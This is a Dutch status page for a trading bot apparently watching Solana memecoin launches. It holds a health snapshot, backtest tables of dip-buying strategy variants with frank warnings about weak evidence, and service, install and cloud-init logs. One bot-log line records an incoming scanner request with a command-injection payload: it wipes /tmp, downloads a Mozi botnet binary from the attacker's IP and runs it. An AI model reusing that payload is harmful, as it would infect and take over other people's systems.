# Schaduwbot status

- tijd: 2026-09-13 01:25:37 UTC
- melding: tick
- host: ubuntu-4gb-fsn1-1 | uptime: up 2 days, 11 hours, 38 minutes
- bot-service: active
- code-versie: b458321
- schijf: 4.0G/38G | geheugen: 1251/3814 MB

## Health
```json
{"ok": true, "last_event_age_s": 0.3, "uptime_s": 17509, "tokens_in_memory": 6447, "msgs": 1995363, "trades": 581073, "creates": 6447, "decode_fail": 53574, "rpc_calls": 15217, "rpc_errors": 1, "sol_usd": 102.10472740929876, "open_positions": 46, "log_all_trades": true, "amm_trades": 0, "amm_skip": 0, "amm_actief": false}
```

## Laatste rapport
```
| dag | created | newpairs | final_stretch | screened | screen_pass | entry | exit |
|---|---|---|---|---|---|---|---|
| 2026-09-10 | 14993 | 2145 | 28 | 2144 | 188 | 4138 | 12355 |
| 2026-09-11 | 28511 | 4468 | 41 | 4467 | 369 | 8202 | 24201 |
| 2026-09-12 | 23127 | 2999 | 15 | 2987 | 255 | 5350 | 15953 |
| 2026-09-13 | 629 | 67 | 0 | 78 | 13 | 119 | 375 |

## Varianten (inzet 0,2 SOL, PumpPortal-fees)

| variant | n | winkans | rug% | gem. winst | gem. verlies | EV/trade | maxDD@20% |
|---|---|---|---|---|---|---|---|
| dip35_V1_gescreend_pass | 597 | 16% | 1.7% | +43.5% | -15.9% | -6.17% | 100% |
| dip35_V1_gescreend_fail | 4670 | 27% | 3.9% | +45.2% | -26.0% | -6.75% | 100% |
| dip35_V1_alle | 6112 | 26% | 4.0% | +44.5% | -25.4% | -6.98% | 100% |
| dip35_V2_gescreend_pass | 593 | 22% | 2.4% | +40.2% | -20.3% | -6.83% | 100% |
| dip35_V2_gescreend_fail | 4738 | 25% | 4.4% | +54.9% | -28.0% | -7.02% | 100% |
| dip35_V2_alle | 6068 | 25% | 4.6% | +52.2% | -27.7% | -7.98% | 100% |
| dip35_V3_gescreend_pass | 600 | 9% | 2.8% | +261.0% | -22.0% | +4.43% | 100% |
| dip35_V3_gescreend_fail | 4855 | 14% | 6.1% | +118.5% | -29.7% | -9.42% | 100% |
| dip35_V3_alle | 6125 | 13% | 6.1% | +117.9% | -29.3% | -9.82% | 100% |
| dip40_V1_gescreend_pass | 567 | 14% | 1.8% | +44.5% | -15.5% | -6.79% | 100% |
| dip40_V1_gescreend_fail | 4592 | 26% | 3.9% | +46.8% | -25.8% | -6.62% | 100% |
| dip40_V1_alle | 5877 | 26% | 3.9% | +46.5% | -25.2% | -6.84% | 100% |
| dip40_V2_gescreend_pass | 565 | 18% | 2.1% | +42.5% | -19.5% | -8.51% | 100% |
| dip40_V2_gescreend_fail | 4635 | 25% | 4.3% | +54.7% | -27.9% | -7.02% | 100% |
| dip40_V2_alle | 5827 | 24% | 4.4% | +52.7% | -27.6% | -8.05% | 100% |
| dip40_V3_gescreend_pass | 571 | 8% | 2.5% | +253.8% | -20.9% | +1.70% | 100% |
| dip40_V3_gescreend_fail | 4739 | 13% | 5.8% | +114.0% | -29.4% | -10.35% | 100% |
| dip40_V3_alle | 5884 | 13% | 5.8% | +113.3% | -29.1% | -10.74% | 100% |
| dip45_V1_gescreend_pass | 545 | 15% | 1.7% | +47.2% | -15.2% | -6.07% | 100% |
| dip45_V1_gescreend_fail | 4507 | 27% | 3.6% | +48.2% | -25.6% | -5.49% | 100% |
| dip45_V1_alle | 5680 | 26% | 3.6% | +48.4% | -25.0% | -5.91% | 100% |
| dip45_V2_gescreend_pass | 542 | 18% | 2.0% | +41.5% | -19.5% | -8.20% | 100% |
| dip45_V2_gescreend_fail | 4542 | 25% | 4.0% | +58.3% | -27.6% | -5.86% | 100% |
| dip45_V2_alle | 5631 | 24% | 4.1% | +56.6% | -27.3% | -6.90% | 100% |
| dip45_V3_gescreend_pass | 549 | 8% | 2.0% | +286.8% | -20.2% | +4.92% | 100% |
| dip45_V3_gescreend_fail | 4631 | 14% | 5.5% | +121.0% | -29.0% | -8.03% | 100% |
| dip45_V3_alle | 5680 | 13% | 5.4% | +123.3% | -28.6% | -8.52% | 100% |

## Beste variant: dip45_V3_gescreend_pass

- n>=500: ✅
- winkans>=0.50: ❌
- rug<=0.05: ✅
- ev>=+0.03: ✅
- maxdd20<=0.40: ❌
- Monte Carlo (20% inzet): kans 10.000× 0.1%, kans ruïne 99.9%

## Community-proxy (regel 3, niet als filter — alleen X-link aanwezig ja/nee)

Proxy voor regel 3 uit het bouwplan (community-check): alleen X-link aanwezig ja/nee, niet de daadwerkelijke activiteit. Inzet 0,2 SOL / PumpPortal-fees, alleen gescreend_pass. Let op: 'gepoold' telt elk token één keer per dip%/exit-variant, dus die n is geen aantal onafhankelijke waarnemingen. 'per_token' telt elk token één keer (gemiddelde over zijn varianten) en is de eerlijke steekproefgrootte. Niets hiervan is vooraf vastgelegd.

| groep | n | winkans | rug% | EV/trade | 95%-marge | mediaan | top-3 aandeel van de winst | maxDD@20% |
|---|---|---|---|---|---|---|---|---|
| per_token_met_xlink | 470 | 16% | 4.9% | -8.29% | -11.5% tot -5.1% | -14.3% | – | 100% |
| per_token_zonder_xlink | 143 | 22% | 0.0% | +16.44% | -11.7% tot +44.6% | -13.2% | 131% | 58% |
| gepoold_met_xlink | 3941 | 13% | 2.7% | -9.45% | -10.7% tot -8.2% | -15.2% | – | 100% |
| gepoold_zonder_xlink | 1188 | 19% | 0.0% | +16.34% | -0.1% tot +32.8% | -14.4% | 72% | 100% |

Een EV die grotendeels uit drie trades komt, en een 95%-marge die door nul loopt, zijn geen bewijs van een verschil. Als dit blijft staan, moet het vooraf vastgelegd en op nieuwe tokens getoetst worden.
```

## Bot-log (laatste 80 regels)
```
Sep 13 00:57:00 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:57:00,758 main INFO screen $CAT pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (52.8s)
Sep 13 00:57:32 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:57:32,528 main INFO screen AI pass=0 dev=0.0 ins=18.25 pro=34 1a=False 1b=False 2=True (51.0s)
Sep 13 00:57:40 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:57:40,383 main INFO screen Axyum pass=0 dev=6.53 ins=0.0 pro=70 1a=False 1b=False 2=False (65.3s)
Sep 13 00:58:06 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:58:06,720 main INFO screen HOBBES pass=0 dev=0.0 ins=35.32 pro=11 1a=False 1b=False 2=True (66.0s)
Sep 13 00:58:22 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:58:22,463 main INFO screen duluth pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (49.9s)
Sep 13 00:58:30 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:58:30,750 main INFO screen HOBBES pass=0 dev=0.0 ins=25.08 pro=38 1a=False 1b=False 2=False (50.4s)
Sep 13 00:58:53 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:58:53,180 main INFO screen NTDA pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=False 2=True (46.5s)
Sep 13 00:59:14 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:59:14,803 main INFO screen lastchanc pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (52.3s)
Sep 13 00:59:16 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:59:16,132 aiohttp.access INFO 127.0.0.1 [13/Sep/2026:00:59:16 +0000] "GET /health HTTP/1.1" 200 502 "-" "Python-urllib/3.14"
Sep 13 00:59:34 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:59:34,923 main INFO screen HOBBES pass=0 dev=0.0 ins=0.0 pro=54 1a=False 1b=False 2=True (64.2s)
Sep 13 00:59:45 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 00:59:45,782 main INFO screen OSbroker pass=0 dev=0.0 ins=48.4 pro=51 1a=False 1b=False 2=True (52.6s)
Sep 13 01:00:26 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:00:26,789 main INFO screen ELAI pass=0 dev=0.0 ins=0.0 pro=9 1a=False 1b=False 2=False (72.0s)
Sep 13 01:00:48 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:00:48,995 main INFO screen FREE pass=1 dev=4.61 ins=11.11 pro=59 1a=False 1b=False 2=False (74.1s)
Sep 13 01:00:59 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:00:59,211 main INFO screen lastchanc pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (73.4s)
Sep 13 01:01:27 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:01:27,001 main INFO screen MCS pass=1 dev=1.74 ins=9.38 pro=33 1a=False 1b=False 2=False (60.2s)
Sep 13 01:01:57 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:01:57,359 main INFO screen Chud pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=False (68.4s)
Sep 13 01:02:02 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:02:02,799 main INFO screen duluth pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=False (63.6s)
Sep 13 01:02:18 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:02:18,389 main INFO screen CHBU pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (51.4s)
Sep 13 01:02:54 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:02:54,612 main INFO screen LaMisery pass=0 dev=0.0 ins=0.18 pro=6 1a=False 1b=False 2=False (57.3s)
Sep 13 01:03:08 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:03:08,068 main INFO screen HALH pass=1 dev=0.0 ins=0.0 pro=13 1a=False 1b=False 2=False (65.3s)
Sep 13 01:03:14 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:03:14,202 main INFO screen SENDOR pass=0 dev=0.0 ins=0.0 pro=5 1a=False 1b=False 2=False (55.8s)
Sep 13 01:03:57 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:03:57,723 main INFO screen nopair pass=0 dev=0.7 ins=24.24 pro=68 1a=False 1b=False 2=True (63.1s)
Sep 13 01:04:07 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:04:07,860 main INFO screen HODL pass=0 dev=0.0 ins=0.0 pro=4 1a=False 1b=False 2=False (59.8s)
Sep 13 01:04:18 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:04:18,175 main INFO screen HOBBES pass=0 dev=0.0 ins=21.26 pro=18 1a=False 1b=False 2=True (64.0s)
Sep 13 01:04:37 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:04:37,077 aiohttp.access INFO 127.0.0.1 [13/Sep/2026:01:04:37 +0000] "GET /health HTTP/1.1" 200 502 "-" "Python-urllib/3.14"
Sep 13 01:05:13 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:05:13,178 main INFO screen STABLE pass=0 dev=0.55 ins=0.0 pro=2 1a=False 1b=False 2=False (75.5s)
Sep 13 01:05:20 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:05:20,115 main INFO screen RICK pass=1 dev=0.0 ins=0.18 pro=13 1a=False 1b=False 2=False (72.3s)
Sep 13 01:05:22 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:05:22,549 main INFO screen BI pass=1 dev=0.0 ins=0.0 pro=44 1a=False 1b=False 2=False (64.4s)
Sep 13 01:06:10 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:06:10,509 main INFO screen duluth pass=0 dev=0.0 ins=0.0 pro=4 1a=False 1b=False 2=False (57.3s)
Sep 13 01:06:31 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:06:31,267 main INFO screen duluth pass=0 dev=0.7 ins=0.0 pro=6 1a=False 1b=False 2=False (71.2s)
Sep 13 01:06:32 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:06:32,636 main INFO screen FL pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (70.1s)
Sep 13 01:07:07 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:07:07,191 main INFO screen POKEMON pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=False 2=True (56.7s)
Sep 13 01:07:44 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:07:44,379 main INFO screen PNKY pass=0 dev=0.08 ins=0.0 pro=5 1a=False 1b=False 2=False (73.1s)
Sep 13 01:07:45 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:07:45,839 main INFO screen VAULT pass=0 dev=0.08 ins=0.0 pro=4 1a=False 1b=False 2=False (73.2s)
Sep 13 01:08:16 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:08:16,051 main INFO screen Organicinu pass=0 dev=0.0 ins=23.47 pro=52 1a=False 1b=False 2=True (68.9s)
Sep 13 01:08:54 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:08:54,890 main INFO screen MIST pass=0 dev=0.0 ins=9.16 pro=64 1a=False 1b=False 2=True (70.5s)
Sep 13 01:08:57 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:08:57,729 aiohttp.access INFO 223.123.47.241 [13/Sep/2026:01:08:57 +0000] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://223.123.47.241:33340/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 174 "-" "-"
Sep 13 01:08:58 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:08:58,126 main INFO screen 67GPT pass=0 dev=0.35 ins=78.96 pro=6 1a=False 1b=False 2=True (72.3s)
Sep 13 01:09:08 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:09:08,870 main INFO screen CHAROC pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=False (52.8s)
Sep 13 01:09:46 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:09:46,026 aiohttp.access INFO 127.0.0.1 [13/Sep/2026:01:09:46 +0000] "GET /health HTTP/1.1" 200 502 "-" "Python-urllib/3.14"
Sep 13 01:10:08 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:10:08,304 main INFO screen duluth pass=0 dev=0.0 ins=0.0 pro=5 1a=False 1b=False 2=False (73.4s)
Sep 13 01:10:09 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:10:09,403 main INFO screen Wood pass=1 dev=0.86 ins=0.0 pro=17 1a=False 1b=False 2=False (71.3s)
Sep 13 01:10:20 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:10:20,906 main INFO screen 仙命决 pass=0 dev=0.35 ins=0.0 pro=1 1a=False 1b=False 2=False (72.0s)
Sep 13 01:11:07 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:11:07,386 main INFO screen MCS pass=1 dev=1.74 ins=3.48 pro=26 1a=False 1b=False 2=False (59.1s)
Sep 13 01:11:22 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:11:22,520 main INFO screen KOL pass=1 dev=0.0 ins=13.61 pro=63 1a=False 1b=False 2=False (73.1s)
Sep 13 01:11:31 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:11:31,200 main INFO screen 100k/Rug pass=0 dev=0.0 ins=0.0 pro=3 1a=False 1b=False 2=False (70.3s)
Sep 13 01:12:13 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:12:13,711 main INFO screen Journal pass=0 dev=0.0 ins=16.36 pro=62 1a=False 1b=False 2=True (66.3s)
Sep 13 01:12:26 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:12:26,567 main INFO screen ROSHI pass=0 dev=0.01 ins=0.0 pro=4 1a=False 1b=False 2=False (64.0s)
Sep 13 01:12:32 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:12:32,577 main INFO screen vrl pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=False (61.4s)
Sep 13 01:13:10 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:13:10,332 main INFO screen GTA 6 Coin pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=False 2=True (56.6s)
Sep 13 01:14:50 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:14:50,285 aiohttp.access INFO 127.0.0.1 [13/Sep/2026:01:14:50 +0000] "GET /health HTTP/1.1" 200 502 "-" "Python-urllib/3.14"
Sep 13 01:15:00 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:15:00,867 main INFO screen sol  pass=0 dev=0.21 ins=0.0 pro=1 1a=False 1b=False 2=False (74.4s)
Sep 13 01:15:24 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:15:24,336 main INFO screen BFC pass=0 dev=0.35 ins=0.0 pro=2 1a=False 1b=False 2=False (77.0s)
Sep 13 01:15:26 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:15:26,811 main INFO screen FL pass=0 dev=0.38 ins=0.0 pro=7 1a=False 1b=False 2=False (80.3s)
Sep 13 01:16:16 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:16:16,522 main INFO screen ​ pass=0 dev=0.0 ins=34.48 pro=70 1a=False 1b=False 2=True (75.7s)
Sep 13 01:16:28 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:16:28,690 main INFO screen LioraLLM pass=0 dev=0.17 ins=48.7 pro=24 1a=False 1b=False 2=True (64.4s)
Sep 13 01:16:56 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:16:56,093 main INFO screen att pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=False (61.9s)
Sep 13 01:17:19 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:17:19,001 main INFO screen duluth pass=0 dev=1.83 ins=0.0 pro=2 1a=False 1b=False 2=False (62.5s)
Sep 13 01:17:40 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:17:40,954 main INFO screen DUCKUS pass=1 dev=0.0 ins=0.0 pro=58 1a=False 1b=False 2=False (58.3s)
Sep 13 01:17:47 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:17:47,385 main INFO screen Flybot pass=0 dev=0.0 ins=21.92 pro=23 1a=False 1b=False 2=False (51.3s)
Sep 13 01:18:22 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:18:22,860 main INFO screen Sherwood pass=0 dev=0.0 ins=10.35 pro=58 1a=False 1b=False 2=True (63.9s)
Sep 13 01:18:33 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:18:33,502 main INFO screen OpenClaw pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=False 2=True (52.5s)
Sep 13 01:18:46 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:18:46,314 main INFO screen REDSKINS pass=0 dev=0.21 ins=0.0 pro=2 1a=False 1b=False 2=False (58.9s)
Sep 13 01:19:21 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:19:21,002 main INFO screen duluth pass=0 dev=0.0 ins=0.0 pro=2 1a=False 1b=False 2=False (58.1s)
Sep 13 01:19:27 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:19:27,375 aiohttp.access INFO 47.251.185.198 [13/Sep/2026:01:19:27 +0000] "UNKNOWN / HTTP/1.0" 400 200 "-" "-"
Sep 13 01:19:27 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:19:27,703 aiohttp.access INFO 47.251.185.198 [13/Sep/2026:01:19:27 +0000] "GET / HTTP/1.1" 404 193 "-" "curl/7.74.0"
Sep 13 01:19:41 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:19:41,558 main INFO screen speed pass=1 dev=0.0 ins=2.29 pro=50 1a=False 1b=False 2=False (68.1s)
Sep 13 01:20:36 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:20:36,651 aiohttp.access INFO 127.0.0.1 [13/Sep/2026:01:20:36 +0000] "GET /health HTTP/1.1" 200 501 "-" "Python-urllib/3.14"
Sep 13 01:20:38 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:20:38,986 main INFO screen $spideyy pass=0 dev=0.21 ins=0.0 pro=2 1a=False 1b=False 2=False (53.8s)
Sep 13 01:21:48 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:21:48,354 main INFO screen WOFI pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=False 2=True (51.5s)
Sep 13 01:22:15 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:22:15,515 aiohttp.access INFO 104.248.206.108 [13/Sep/2026:01:22:15 +0000] "GET / HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
Sep 13 01:23:05 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:23:05,886 main INFO screen NVDA pass=0 dev=79.31 ins=0.0 pro=1 1a=False 1b=False 2=True (59.4s)
Sep 13 01:23:18 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:23:18,954 main INFO screen FLYPAD pass=0 dev=1.0 ins=45.05 pro=66 1a=False 1b=False 2=True (73.5s)
Sep 13 01:23:21 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:23:21,312 main INFO screen $4Stock pass=0 dev=0.0 ins=0.0 pro=1 1a=False 1b=False 2=False (57.0s)
Sep 13 01:23:58 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:23:58,573 main INFO screen dihcoin pass=0 dev=0.0 ins=16.96 pro=36 1a=False 1b=False 2=True (52.7s)
Sep 13 01:24:15 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:24:15,381 main INFO screen MCAT pass=0 dev=0.0 ins=78.96 pro=1 1a=True 1b=True 2=True (56.4s)
Sep 13 01:24:55 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:24:55,474 main INFO screen Pump pass=1 dev=0.0 ins=0.0 pro=11 1a=False 1b=False 2=False (74.6s)
Sep 13 01:24:58 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:24:58,747 main INFO screen ROSHI pass=0 dev=0.0 ins=0.0 pro=1 1a=False 1b=False 2=False (60.2s)
Sep 13 01:25:33 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:25:33,589 main INFO screen Gregory pass=0 dev=0.0 ins=0.0 pro=55 1a=False 1b=False 2=True (75.2s)
Sep 13 01:25:37 ubuntu-4gb-fsn1-1 python[77259]: 2026-09-13 01:25:37,131 aiohttp.access INFO 127.0.0.1 [13/Sep/2026:01:25:37 +0000] "GET /health HTTP/1.1" 200 502 "-" "Python-urllib/3.14"
```

## Update-log (laatste 20 regels)
```
--- update 2026-09-12T23:46:36Z
--- update 2026-09-12T23:51:35Z
--- update 2026-09-12T23:56:36Z
--- update 2026-09-13T00:01:41Z
--- update 2026-09-13T00:07:34Z
--- update 2026-09-13T00:12:34Z
--- update 2026-09-13T00:17:36Z
--- update 2026-09-13T00:22:47Z
--- update 2026-09-13T00:27:48Z
--- update 2026-09-13T00:32:51Z
--- update 2026-09-13T00:38:16Z
--- update 2026-09-13T00:43:31Z
--- update 2026-09-13T00:48:36Z
--- update 2026-09-13T00:53:44Z
--- update 2026-09-13T00:59:15Z
--- update 2026-09-13T01:04:36Z
--- update 2026-09-13T01:09:45Z
--- update 2026-09-13T01:14:49Z
--- update 2026-09-13T01:20:35Z
--- update 2026-09-13T01:25:36Z
```

## Analyses (laatste 25 regels)
```
inactive
23:35:46   6000 tokens, 688210 trades, 122374 posities (6s)
23:35:48   8000 tokens, 921686 trades, 162734 posities (8s)
23:35:50   10000 tokens, 1135604 trades, 196113 posities (10s)
23:35:51   12000 tokens, 1349153 trades, 233527 posities (12s)
23:35:53   14000 tokens, 1588659 trades, 274748 posities (14s)
23:35:55   16000 tokens, 1834927 trades, 321633 posities (16s)
23:35:57   18000 tokens, 2068652 trades, 363238 posities (18s)
23:35:59   20000 tokens, 2279221 trades, 395972 posities (19s)
23:36:01   22000 tokens, 2522883 trades, 438063 posities (22s)
23:36:03   24000 tokens, 2754441 trades, 480456 posities (24s)
23:36:05   26000 tokens, 2971188 trades, 518109 posities (26s)
23:36:08   28000 tokens, 3219985 trades, 563915 posities (28s)
23:36:10   30000 tokens, 3442161 trades, 600680 posities (31s)
23:36:12   32000 tokens, 3661378 trades, 636345 posities (32s)
23:36:14   34000 tokens, 3894647 trades, 678808 posities (34s)
23:36:16   36000 tokens, 4117009 trades, 718803 posities (36s)
23:36:18   38000 tokens, 4355204 trades, 762415 posities (38s)
23:36:20   40000 tokens, 4596413 trades, 807401 posities (40s)
23:36:22   42000 tokens, 4826483 trades, 859888 posities (42s)
23:36:23 posities: 876726 uit 4907398 trades (43s)
23:36:34 183439 wallets gerekend
23:36:34 geluk-toets
23:37:07 persistentie
23:37:10 kopieer-simulatie
23:37:33 klaar in 113s -> /opt/schaduwbot/reports/wallets.md
```

## Bootstrap-log (laatste 60 regels)
```
Unpacking libcurl4t64:amd64 (8.18.0-1ubuntu2.5) over (8.18.0-1ubuntu2.4)…
Preparing to unpack …/08-libcurl3t64-gnutls_8.18.0-1ubuntu2.5_amd64.deb…
Unpacking libcurl3t64-gnutls:amd64 (8.18.0-1ubuntu2.5) over (8.18.0-1ubuntu2.4)…
Selecting previously unselected package python3-wheel.
Preparing to unpack …/09-python3-wheel_0.46.3-2_all.deb…
Unpacking python3-wheel (0.46.3-2)…
Selecting previously unselected package python3-pip.
Preparing to unpack …/10-python3-pip_25.1.1+dfsg-1ubuntu2_all.deb…
Unpacking python3-pip (25.1.1+dfsg-1ubuntu2)…
Selecting previously unselected package python3-pip-whl.
Preparing to unpack …/11-python3-pip-whl_25.1.1+dfsg-1ubuntu2_all.deb…
Unpacking python3-pip-whl (25.1.1+dfsg-1ubuntu2)…
Selecting previously unselected package python3-setuptools-whl.
Preparing to unpack …/12-python3-setuptools-whl_78.1.1-0.1build1_all.deb…
Unpacking python3-setuptools-whl (78.1.1-0.1build1)…
Selecting previously unselected package python3.14-venv.
Preparing to unpack …/13-python3.14-venv_3.14.4-1ubuntu0.2_amd64.deb…
Unpacking python3.14-venv (3.14.4-1ubuntu0.2)…
Selecting previously unselected package python3-venv.
Preparing to unpack …/14-python3-venv_3.14.3-0ubuntu2_amd64.deb…
Unpacking python3-venv (3.14.3-0ubuntu2)…
Setting up python3-setuptools-whl (78.1.1-0.1build1)…
Setting up libcurl4t64:amd64 (8.18.0-1ubuntu2.5)…
Setting up python3-pip-whl (25.1.1+dfsg-1ubuntu2)…
Setting up libpython3.14-minimal:amd64 (3.14.4-1ubuntu0.2)…
Setting up libcurl3t64-gnutls:amd64 (8.18.0-1ubuntu2.5)…
Setting up python3-wheel (0.46.3-2)…
Setting up python3.14-gdbm (3.14.4-1ubuntu0.2)…
Setting up python3-pip (25.1.1+dfsg-1ubuntu2)…
Setting up curl (8.18.0-1ubuntu2.5)…
Setting up python3.14-minimal (3.14.4-1ubuntu0.2)…
Setting up libpython3.14-stdlib:amd64 (3.14.4-1ubuntu0.2)…
Setting up libpython3.14:amd64 (3.14.4-1ubuntu0.2)…
Setting up python3.14 (3.14.4-1ubuntu0.2)…
Setting up python3.14-venv (3.14.4-1ubuntu0.2)…
Setting up python3-venv (3.14.3-0ubuntu2)…
Processing triggers for systemd (259.5-0ubuntu3.4)…
Processing triggers for man-db (2.13.1-1build1)…
Processing triggers for libc-bin (2.43-2ubuntu2.3)…

Running kernel seems to be up-to-date.

Restarting services...
 systemctl restart packagekit.service

Service restarts being deferred:
 systemctl restart cloud-init-main.service
 systemctl restart networkd-dispatcher.service
 systemctl restart unattended-upgrades.service

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
Created symlink '/etc/systemd/system/multi-user.target.wants/schaduwbot.service' → '/etc/systemd/system/schaduwbot.service'.
install klaar
status.md -> 200 
report.json -> 201 
===== bootstrap klaar 2026-09-10T13:48:49Z =====
```

## cloud-init (laatste 25 regels)
```
|.BoBoB.          |
|  o.. +E         |
| .   .. S .      |
|.    . o =       |
| .  . + + .      |
| .+o . . o       |
| .**.            |
+----[SHA256]-----+
Generating public/private ed25519 key pair.
Your identification has been saved in /etc/ssh/ssh_host_ed25519_key
Your public key has been saved in /etc/ssh/ssh_host_ed25519_key.pub
The key fingerprint is:
SHA256:w2XLkdz/wp4oYdhzAWpZtAWfv0pFj8xAggp36PYfUQQ root@ubuntu-4gb-fsn1-1
The key's randomart image is:
+--[ED25519 256]--+
|       . oE++    |
|    . o o.oO..   |
|     + o +Bo= .  |
|      +.++.o.B o |
|     . oSoo. .B .|
|        o.* .o o |
|         o =. + .|
|          o. + o |
|           .o o  |
+----[SHA256]-----+
```
